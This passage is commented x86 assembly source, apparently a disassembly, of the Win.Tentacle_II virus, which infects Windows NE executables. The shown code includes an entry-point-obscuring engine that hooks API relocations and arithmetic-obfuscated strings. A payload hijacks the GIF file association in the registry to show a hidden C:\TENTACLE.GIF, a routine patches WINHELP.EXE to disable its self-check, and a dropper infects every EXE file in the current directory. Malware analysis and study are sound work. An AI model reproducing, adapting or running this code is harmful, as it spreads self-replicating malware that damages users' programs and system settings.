        cmp     [bp.bytes_to_copy],256  ; more than 256 bytes left?
        JBE     copy_remaining_bytes_block

        mov     cx,256                  ; then just copy 256 bytes
        JMP     read_file_block

copy_remaining_bytes_block:
        mov     cx,word ptr [bp.bytes_to_copy]  ; copy all bytes left

read_file_block:
        push    cx                      ; save size to read/write
        mov     bx,[bp.source_handle]   ; BX=handle of source file
        mov     ah,3Fh                  ; read from file function
        push    ds                      ; save DS
        push    ss                      ; DS=SS
	pop	ds
	int	21h

        pop     ds                      ; restore DS
        mov     bx,[bp.dest_handle]     ; BX=handle of destination file
        mov     cx,ax                   ; write as many bytes as were read
        mov     ah,40h                  ; write block to temporary file
        push    ds                      ; save DS
        push    ss                      ; DS=SS
	pop	ds
	int	21h

        pop     ds                      ; restore DS
        cmp     cx,ax                   ; sizes of read block=written block ?
        pop     cx                      ; restore size to read and write
        JNZ     copy_file_block_error   ; if not equal, then an error occured
        cmp     cx,ax                   ; size of read/written block equal
                                        ; to the size we planned to read?
        JNE     copy_file_block_done    ; if not, we're at the end of the file

        cwde                            ; convert word to dword (AX->EAX)
        sub     [bp.bytes_to_copy],eax  ; we've copied EAX bytes more
        JMP     copy_file_block_loop    ; copy next file block

copy_file_block_error:
        stc                             ; set carry flag (indicate error)
        JMP     copy_file_block_ret

copy_file_block_done:
        clc                             ; clear carry flag (indicate success)
        add     sp,256                  ; remove buffer from stack
        popad                           ; restore all 32bit registers

copy_file_block_ret:
	RET


; ----- SEARCH MODULE NAME --------------------------------------------------
;
; searches the module name pointed to by DX in the imported names table and
; returns in AX its number, otherwise indicates error with carry flag set

search_module_name:
        push    bx                      ; save BX
        push    es                      ; save ES

        sub     sp,256                  ; reserve a 256 bytes buffer on stack
	mov	di,dx

        push    ss                      ; ES=SS
	pop	es

        xor     eax,eax                 ; EAX=0
        mov     ax,word ptr [bp.rw_buffer+28h]  ; ptr to module-reference
                                                ; table (from NE header)
        add     eax,[bp.new_header_offs]; EAX=ptr to module-reference table
                                        ; (from file start)

        push    eax                     ; CX:DX=EAX
	pop	dx
	pop	cx
        mov     ax,4200h                ; set file pointer relative to
                                        ; file start to module reference table
	int	21h
        JC      module_name_not_found

        mov     ah,3Fh                  ; read module reference table
        mov     cx,word ptr [bp.rw_buffer+1Eh]  ; number of entries in
                                        ; module reference table
        shl     cx,1                    ; multiply with two (each entry
                                        ; in module reference table is a word)
        mov     dx,sp                   ; DS:DX=ptr to our buffer on stack
	int	21h
        JC      module_name_not_found

        xor     eax,eax                 ; EAX=0
        mov     ax,word ptr [bp.rw_buffer+2Ah]  ; ptr to imported-names table
                                                ; (relative to NE header)
        add     eax,[bp.new_header_offs]; EAX=ptr to imported-names table
                                        ; relative to file start

        push    eax                     ; CX:DX=EAX
	pop	dx
	pop	cx
        mov     ax,4200h                ; set file pointer relative to
                                        ; file start to imported-names table
	int	21h
        JC      module_name_not_found

        mov     ah,3Fh                  ; read imported-names table
        mov     cx,128                  ; read 128 bytes
        mov     dx,sp                   ; DS:DX=ptr to buffer on stack
        add     dx,128                  ; assume module-reference table is
                                        ; not longer than 128 bytes too
	int	21h
        JC      module_name_not_found

        mov     bx,sp                   ; BX=module-reference table buffer
        xor     cx,cx                   ; CX=0
        JMP     check_if_all_modules_done

search_module_name_loop:
        mov     si,sp                   ; SI=buffer on stack
        add     si,128                  ; SI=imported-names table buffer
        add     si,[bx]                 ; add offset from module-reference
                                        ; table to get a actual entry in the
                                        ; imported-names table

        push    cx                      ; save CX (module counter)
        push    di                      ; save DI (offset of module name
                                        ; to search for)

        xor     ch,ch                   ; CH=0
        mov     cl,[si]                 ; length of this entry in the
                                        ; imported-names table

        inc     cl                      ; also compare the string-length byte
        cld                             ; clear direction flag
        repe    cmpsb                   ; compare the strings

        pop     di                      ; restore DI (offset of module name
                                        ; to search for)
        pop     cx                      ; restore CX (module counter)

        JZ      found_module_name
        inc     cx                      ; incerement CX (module counter)
        add     bx,2                    ; go to next entry in module-
                                        ; reference table
check_if_all_modules_done:
        cmp     cx,word ptr [bp.rw_buffer+1Eh]  ; done all modules ?
        JNE     search_module_name_loop ; if not, search on
        JMP     module_name_not_found   ; if yes, the search failed

found_module_name:
        mov     ax,cx                   ; AX=module counter
        inc     ax                      ; make counter start from 1
        add     sp,256                  ; remove buffer from stack
        clc                             ; clear carry flag (indicate success)
        JMP     exit_search_module_name

module_name_not_found:
        add     sp,256                  ; remove buffer from stack
	stc				; Set carry flag

exit_search_module_name:
        pop     es                      ; restore ES
        pop     bx                      ; restore BX
        RET


; ----- EPO ENGINE ----------------------------------------------------------
;
; Entry: none
;
; Exit:
; EAX - module index (in MSW) and API ordinal (in LSW) of found reloc item
; EDX - file offset of relocation item to modify

EPO:

        ; create the string 6, "KERNEL" in tmp_buffer

        mov     dword ptr [bp.tmp_buffer+4],5AD5762Dh
        mov     dword ptr [bp.tmp_buffer+0],0F220B44Bh
        add     dword ptr [bp.tmp_buffer+0],602496BBh
        add     dword ptr [bp.tmp_buffer+4],0A576CF21h
        lea     dx,[bp.tmp_buffer]      ; DX=pointer to 6, "KERNEL"
        CALL    search_module_name
        JC      check_VBrun
        mov     dx,5Bh                  ; ordinal of InitTask API
        JMP     search_API_reference

check_VBrun:
        ; create the string 8, "VBRUN300" in tmp_buffer
        mov     dword ptr [bp.tmp_buffer+4],9062F740h
        mov     dword ptr [bp.tmp_buffer+0],0EDC4FE68h
        mov      byte ptr [bp.tmp_buffer+8],"0"
        add     dword ptr [bp.tmp_buffer+4],9FD05715h
        add     dword ptr [bp.tmp_buffer+0],647D57A0h
        lea     dx,[bp.tmp_buffer]      ; Load effective addr
        CALL    search_module_name
        JC      end_EPO
        mov     dx,64h                  ; ordinal of THUNRTMAIN API

search_API_reference:
        push    ax                      ; save AX (module index)
        push    dx                      ; save DX (API function ordinal)

        xor     eax,eax                 ; EAX=0
        mov     ax,word ptr [bp.rw_buffer+22h]  ; segment table offset
                                                ; (relative to NE header)
        add     eax,[bp.new_header_offs]; EAX=segment table offset (relative
                                        ; to file start)
        xor     ecx,ecx                 ; ECX=0
        mov     cx,word ptr [bp.rw_buffer+16h]  ; entry code segment index
        dec     cx                      ; make segment counter start at zero
        shl     ecx,3                   ; multiply with 8 (segment table
                                        ; entry size)
        add     eax,ecx                 ; EAX=offset of entry code segment
                                        ; descriptor (from filestart)
        push    eax                     ; CX:DX=EAX
	pop	dx
	pop	cx
        mov     ax,4200h                ; go to descriptor of entry code segm
	int	21h

        pop     dx                      ; restore DX (API function ordinal)
        pop     ax                      ; restore AX (module index)
        JC      end_EPO
        mov     cl,byte ptr [bp.rw_buffer+32h]  ; CL=alignemt shift

        push    bp                      ; save BP (main data stack frame)
        sub     sp,size EPO_stack_frame ; create new data buffer on stack
        mov     bp,sp                   ; and set BP to it

        push    cx                      ; save CX (alignemt shift)
        mov     [bp.module_index],ax    ; save module index
        mov     [bp.API_ordinal],dx     ; save API function ordinal

        mov     ah,3Fh                  ; read entry code segment descriptor
        mov     cx,8                    ; size of a segment descriptor
        lea     dx,[bp.entry_CS_offset] ; DS:DX=pointer to read buffer
	int	21h
        pop     cx                      ; restore CX (alignment shift)
        JC      EPO_failed

        xor     edx,edx                 ; EDX=0
        mov     dx,[bp.entry_CS_offset] ; EDX=segment file offset (aligned)
        shl     edx,cl                  ; EDX=segment file offset (in bytes)
        xor     eax,eax                 ; EAX=0
        mov     ax,[bp.entry_CS_phys]   ; EAX=segment physical size
        add     edx,eax                 ; EDX=file offset of segment relocs
        mov     [bp.entry_CS_relocs],edx; save it

        push    edx                     ; CX:DX=EDX
	pop	dx
	pop	cx
        mov     ax,4200h                ; go to entry code segment relocations
	int	21h
        JC      EPO_failed

        mov     ah,3Fh                  ; read number of relocation items
        mov     cx,2                    ; read one word
        lea     dx,[bp.relocs_number]   ; DS:DX=pointer to read buffer
	int	21h
        JC      EPO_failed

        xor     ecx,ecx                 ; ECX=0
        JMP     check_if_all_relocs_done

search_API_reference_loop:
        push    cx                      ; save CX

        mov     ah,3Fh                  ; read a relocation item
        mov     cx,8                    ; size of relocation item
        lea     dx,[bp.reloc_type]      ; DS:DX=ptr to read buffer
        int     21h

        pop	cx
        JC      EPO_failed

        mov     eax,dword ptr [bp.module_index] ; EAX=module index and
                                                ; API ordinal
        cmp     [bp.reloc_what],eax
        JNE     check_next_reloc
        cmp     word ptr [bp.reloc_type],103h  ; check relocation type: must
                                           ; be 32bit far ptr and API ordinal
        JE      found_API_reference
check_next_reloc:
	inc	cx
check_if_all_relocs_done:
        cmp     cx,[bp.relocs_number]
        JNE     search_API_reference_loop
        JMP     EPO_failed

found_API_reference:
        mov     edx,[bp.entry_CS_relocs]
	add	edx,2
        shl     ecx,3                   ; ECX=ECX*8 (size of a reloc item)
        add     edx,ecx                 ; EDX=offset of reloc item in file
        mov     eax,dword ptr [bp.module_index]; EAX=module index/API ordinal

        add     sp,size EPO_stack_frame ; clear buffer from stack
        pop     bp                      ; restore old stack frame pointer
        clc                             ; clear carry flag (indicate success)
        JMP     end_EPO

EPO_failed:
        add     sp,size EPO_stack_frame ; clear buffer from stack
	pop	bp
        stc                             ; set carry flag (indicate error)

end_EPO:
        RET


gif_body:
        include gif.inc                 ; the body of the gif file converted
                                        ; to DB instructions
gif_body_size   EQU ($ - offset gif_body)


shell_open_command      db "\SHELL\OPEN\COMMAND", 0
l_shell_open_command    EQU ($ - offset shell_open_command)


; ----- PAYLOAD -------------------------------------------------------------

payload:
        push    es                      ; save ES
        push    bp                      ; save BP (main stack frame pointer)

        sub     sp,size payload_stack_frame  ; reserve room on stack
        mov     bp,sp                   ; setup new stack frame

        push    ax                      ; save AX (what to do flag)


;*      push    dword ptr 1             ; HKEY_CURRENT_USER
        db      66h,68h,1,0,0,0         ; fixup - byte match

        mov     word ptr [bp.reg_buffer2],"G."; name of the subkey: ".GIF",0
        mov     dword ptr [bp.reg_buffer2+2],"FI"
        push    ss                      ; push a far pointer to the name
        lea     ax,[bp.reg_buffer2]     ; of the subkey
	push	ax

        push    ss                      ; push a far pointer to the buffer
        lea     ax,[bp.reg_buffer1]     ; that will hold the return string
	push	ax

        mov     [bp.size_reg_buffer],40h; size of buffer for return string
        push    ss                      ; push a far pointer to the
        lea     ax,[bp.size_reg_buffer] ; dword that holds the size for the
        push    ax                      ; return string

        CALL    cs:RegQueryValue        ; far call to the RegQueryValue API


        or      ax,ax                   ; zero means success
        JZ      RegQueryValue_success
        pop     ax                      ; clear stack
        JMP     exit_payload

RegQueryValue_success:
        cmp     byte ptr [bp.reg_buffer1],0; has it returned an empty string?
        JE      try_shell_open_command

        push    ss                      ; ES=SS
	pop	es

        lea     di,[bp.reg_buffer1]     ; DI=offset retrun string
        cld                             ; clear direction flag
        xor     al,al                   ; AL=0
        mov     cx,0FFFFh               ; CX=maximal word
        repne   scasb                   ; search for the end of the string
        dec     di                      ; DI points now to the terminating 0

        push    ds                      ; save DS
        push    cs                      ; DS=CS
	pop	ds

        mov     si,offset shell_open_command
        CALL    decrypt_path            ; decrypt & append it to the result
                                        ; of the RegQueryValue call
        pop     ds                      ; restore DS
        CALL    call_RegQueryValue
        or      ax,ax                   ; zero means success
        pop     ax                      ; restore AX (entry flag)
        JZ      RegQueryValue_success2

try_shell_open_command:
        mov     word ptr [bp.reg_buffer1],"G."
        mov     dword ptr [bp.reg_buffer1+2],"FI"

        push    ds                      ; save DS

        push    cs                      ; DS=CS
	pop	ds

        push    ss                      ; ES=SS
	pop	es

        mov     si,offset shell_open_command
        lea     di,[bp.reg_buffer1+4]   ; Load effective addr
        mov     cx,l_shell_open_command ; useless, the decrypt_path procedure
                                        ; gets the string length itself.
        CALL    decrypt_path
        pop     ds                      ; restore DS
        CALL    call_RegQueryValue
        or      ax,ax                   ; zero means success
	pop	ax
        JNZ     exit_payload

RegQueryValue_success2:
        ; reg_buffer2 contains now the commandline of the program that is
        ; runned whenever the user doubleclics on a .GIF file

        or      ax,ax                   ; check the entry flag in AX
        JZ      restore_gif_commandline

        push    ss                      ; ES=SS
	pop	es
        lea     di,[bp.reg_buffer2]     ; DI=pointer to commandline connected
                                        ; with .GIF files
        push    di                      ; save DI
        xor     al,al                   ; AL=0
        mov     cx,0FFFFh               ; CX=maximal word
        repne   scasb                   ; search for the end of the string
        dec     di                      ; DI points now to the terminating 0
        mov     ax,di                   ; AX=end of string
        pop     di                      ; restore DI (start of string)
        sub     ax,di                   ; AX=length of string
        mov     cx,ax                   ; CX=length of string
        mov     al,"%"                  ; search the commandline for where
                                        ; the name of the gif will be on
                                        ; program start
        cld                             ; clear direction flag
        repne   scasb                   ; search for the % sign
        JNZ     exit_payload            ; if not found, exit payload
        cmp     byte ptr [di],"1"       ; is it the %1, like it has to be?
        JNE     exit_payload            ; if not, something is wrong
        cmp     byte ptr [di-2],'"'     ; is there the quotes sign?
        JNE     dont_skip_quotes
        dec     di                      ; if yes, skip it
dont_skip_quotes:
        dec     di                      ; go to the start of the first
                                        ; parameter in the commandline, the
                                        ; name of the .GIF file

        mov     dword ptr [di+9],"G.EL" ; create there the "C:\TENTACLE.GIF"
        mov     byte ptr [di],"C"       ; string
	mov	dword ptr [di+5],7E00FD39h
        mov     dword ptr [di+0Dh],"FI"
	add	dword ptr [di+5],0C5405715h
        mov     dword ptr [di+1],"ET\:"
        push    di                      ; save DI (offs of "C:\TENTACLE.GIF")
        CALL    call_RegSetValue        ; set the new value.

        ; from now on, everytimes the user doubleclicks on a gif file, it
        ; will only see C:\TENTACLE.GIF ;-)

        mov     ah,3Ch                  ; create C:\TENTACLE.GIF file
        mov     cx,7                    ; readonly,hidden,system attributes
        pop     dx                      ; DS:DX=ptr to filename to create
                                        ; ("C:\TENTACLE.GIF")
	int	21h
        JC      exit_payload

        mov     bx,ax                   ; handle to BX

        mov     word ptr [bp.reg_buffer2+2],"8F"  ; create GIF marker in the
        mov     word ptr [bp.reg_buffer2+0],"IG"  ; buffer ("GIF87a")
        mov     word ptr [bp.reg_buffer2+4],"a7"

        mov     ah,40h                  ; write GIF marker
        mov     cx,6                    ; size of gif marker
        lea     dx,[bp.reg_buffer2]     ; DS:DX=pointer to write buffer
	int	21h

        mov     ah,40h                  ; write gif file body
        mov     cx,gif_body_size        ; size to write
        mov     dx,offset gif_body      ; DS:DX=pointer to write buffer
        push    ds                      ; save DS
        push    cs                      ; DS=CS
	pop	ds
	int	21h

        pop     ds                      ; restore DS

        mov     ah,3Eh                  ; close file
	int	21h

        JMP     exit_payload            ; payload is done

restore_gif_commandline:
        push    ss                      ; ES=SS
	pop	es
        lea     di,[bp.reg_buffer2]     ; DI=pointer to commandline connected
                                        ; with .GIF files
        cld                             ; clear direction flag
        push    di                      ; save DI
        xor     al,al                   ; AL=0
        mov     cx,0FFFFh               ; CX=maximal word
        repne   scasb                   ; search for the end of the string
        dec     di                      ; DI points now to the terminating 0
        mov     ax,di                   ; AX=end of string
        pop     di                      ; restore DI (start of string)
        sub     ax,di                   ; AX=length of string
	add	di,ax
        mov     cx,ax                   ; CX=length of string
        mov     al," "                  ; search for the blank
        std                             ; set direction flag
        repne   scasb                   ; search for the end of the filename
        JNZ     exit_payload            ; if not found, exit
        add     di,2                    ; go to 1st param (file to display)
        cmp     byte ptr [di],"C"       ; is there "C:\TENTACLE.GIF"
        JNE     exit_payload            ; if not, there's nothing to restore
        cmp     dword ptr [di+1],"ET\:" ; make really sure
        JNE     exit_payload
        mov     byte ptr [di],"%"       ; restore the correct cmdline "%1"
        mov     word ptr [di+1],"1"
        CALL    call_RegSetValue        ; set it.

exit_payload:
        add     sp,size payload_stack_frame  ; free room on stack
        pop     bp                      ; restore BP (main stack frame ptr)
        pop     es                      ; restore ES
        RET


call_RegQueryValue:
;*      push    dword ptr 1             ; HKEY_CURRENT_USER
        db      66h,68h,1,0,0,0         ; fixup - byte match

        push    ss                      ; push a far pointer to the name
        lea     ax,[bp.reg_buffer1]     ; of the subkey
	push	ax

        push    ss                      ; push a far pointer to the buffer
        lea     ax,[bp.reg_buffer2]     ; that will hold the return string
	push	ax

        mov     [bp.size_reg_buffer],40h; size of buffer for return string
        push    ss                      ; push a far pointer to the
        lea     ax,[bp.size_reg_buffer] ; dword that holds the size for the
        push    ax                      ; return string

        CALL    cs:RegQueryValue        ; far call to the RegQueryValue API

        RET


call_RegSetValue:
;*      push    dword ptr 1             ; HKEY_CURRENT_USER
        db      66h,68h,1,0,0,0         ; fixup - byte match

        push    ss                      ; push a far pointer to the name
        lea     ax,[bp.reg_buffer1]     ; of the subkey
	push	ax

;*      push    dword ptr 0             ; REG_SZ (ASCIIZ string)
        db      66h,68h,1,0,0,0         ; fixup - byte match

        push    ss                      ; push a far pointer to the buffer
        lea     ax,[bp.reg_buffer2]     ; that will hold the return string
	push	ax

;*      push    dword ptr 0             ; size of value data
        db      66h,68h,0,0,0,0         ; fixup - byte match

        CALL    cs:RegSetValue          ; far call to the RegSetValue API

        RET


; ----- PATCH WINHELP -------------------------------------------------------

patch_winhelp:
        cmp     word ptr [bp.rw_buffer+1Ch],2   ; number of segments
        JB      exit_patch_winhelp              ; it's not the WINHELP.EXE
                                                ; we know, don't patch it

        xor     eax,eax                         ; EAX=0
        mov     ax,word ptr [bp.rw_buffer+22h]  ; offset of segment table
                                                ; (relative to NE header)
        add     eax,[bp.new_header_offs]        ; now relative to file start
;*      add     eax,8                           ; go to 2nd segment descriptor
        db      66h, 83h,0C0h, 08h              ; fixup - byte match

        push    eax                     ; CX:DX=EAX
	pop	dx
	pop	cx
        mov     ax,4200h                ; set filepointer to the
        int     21h                     ; descriptor.

        mov     ah,3Fh                  ; read the aligned segment file offset
        mov     cx,2                    ; read one word
        lea     dx,[bp.tmp_buffer]      ; DS:DX=pointer to read buffer
	int	21h

        xor     eax,eax                 ; EAX=0
        mov     ax,word ptr [bp.tmp_buffer] ; EAX=aligned segment file offset
        mov     cl,byte ptr [bp.rw_buffer+32h] ; CL=alignment shift
        shl     eax,cl                  ; EAX=segment file offset in bytes
;*      add     eax,22h                 ; go to offset 22h in 2nd segment
        db      66h,83h,0C0h,22h        ; fixup - byte match

        push    eax                     ; CX:DX=EAX
	pop	dx
	pop	cx
        mov     ax,4200h                ; set filepointer to offset 22h in
        int     21h                     ; the second segment
        JC      exit_patch_winhelp

        mov     ah,3Fh                  ; read two bytes of program code
        mov     cx,2                    ; size to read
        lea     dx,[bp.tmp_buffer]      ; DS:DX=pointer to read buffer
	int	21h
        JC      exit_patch_winhelp

        cmp     word ptr [bp.tmp_buffer],1474h  ; is it a JE $+16h ?
        JNE     exit_patch_winhelp      ; if not, it's not the WINHELP.EXE
                                        ; we know, don't patch it.

        mov     ax,4201h                ; set filepointer back to the
                                        ; conditional jmp
        mov     cx,-1                   ; CX:DX=-2
        mov     dx,-2
	int	21h

        mov     byte ptr [bp.tmp_buffer],0EBh  ; a unconditional JMP SHORT

        mov     ah,40h                  ; patch the file with the
                                        ; unconditional JMP
        mov     cx,1                    ; write one byte
        lea     dx,[bp.tmp_buffer]      ; DS:DX=pointer to the write buffer
	int	21h

                                        ; WINHELP.EXE now has no self-check
                                        ; any more ;-)

exit_patch_winhelp:
        RET


        db      3 dup(0)                ; maybe the author wanted the
                                        ; relocation addresses on an address
                                        ; divisible by 4 ?

RegQueryValue   dd      0000FFFFh
RegSetValue     dd      0000FFFFh
org_entry       dd      0000FFFFh

virus_end:

; Most data of the virus is stored in a buffer on the stack. The following
; structure represents the lay-out of this stack frame:

stack_frame     struc
dta             db 2Bh dup(?)
tmp_buffer      db 10 dup(?)
bytes_to_copy   dd ?
full_filename   db 24 dup(?)
full_filespec   db 24 dup(?)
tmp_filename    db 16 dup(?)
source_handle   dw ?
dest_handle     dw ?
file_date       dw ?
file_time       dw ?
file_size       dd ?
new_header_offs dd ?
end_of_NE_hdr   dd ?
alignment_unit  dd ?
first_segm_offs dd ?
new_sect_descr  dw 4 dup(?)
rw_buffer       db 64 dup(?)
                dw ?
our_reloc_offs  dd ?
module_ordinal  dd ?
new_entry_CS    dw ?
new_entry_IP    dw ?
stack_frame     ends


; The data that is used in the EPO engine of the virus uses another stack
; frame that is represented in this structure:

EPO_stack_frame struc
entry_CS_offset dw ?
entry_CS_phys   dw ?
entry_CS_flags  dw ?
entry_CS_virt   dw ?
reloc_type      dw ?
reloc_offs      dw ?
reloc_what      dd ?
module_index    dw ?
API_ordinal     dw ?
entry_CS_relocs dd ?
relocs_number   dw ?
EPO_stack_frame ends


; Also the payload routine uses its own stack frame:

payload_stack_frame struc
reg_buffer1     db 40h dup(?)
reg_buffer2     db 40h dup(?)
size_reg_buffer dd ?
payload_stack_frame ends



first_gen_entry:
        push    ds                      ; save DS
        pusha                           ; save all registers

        push    ss                      ; DS=SS
	pop	ds

        sub     sp,size stack_frame     ; reserve room on stack
        mov     bp,sp                   ; setup stack frame

        mov     ah,1Ah                  ; set DTA to DS:DX
        lea     dx,[bp.dta]             ; Load effective addr
        int     21h

        mov     si, offset exe_wildcard ; encrypt all the strings in the
        call    encrypt_wildcard        ; virus by a simple inc/dec
        mov     si, offset scr_wildcard ; algorithm
        call    encrypt_wildcard

        mov     si, offset C_win
        call    encrypt_path
        mov     si, offset C_windows
        call    encrypt_path
        mov     si, offset C_win31
        call    encrypt_path
        mov     si, offset C_win311
        call    encrypt_path
        mov     si, offset C_win95
        call    encrypt_path
        mov     si, offset shell_open_command
        call    encrypt_path

        mov     bx,0FFFFh
        mov     cx,offset empty_string
        mov     dx,offset exe_wildcard
        CALL    infect_directory        ; infect all EXE files in current dir

        mov     ah,9
        mov     dx,offset first_gen_message
        int     21h

        mov     ax,4C00h
        int     21h

first_gen_message db "Win.Tentacle_II virus dropped", 0Dh, 0Ah, "$"

end first_gen_entry
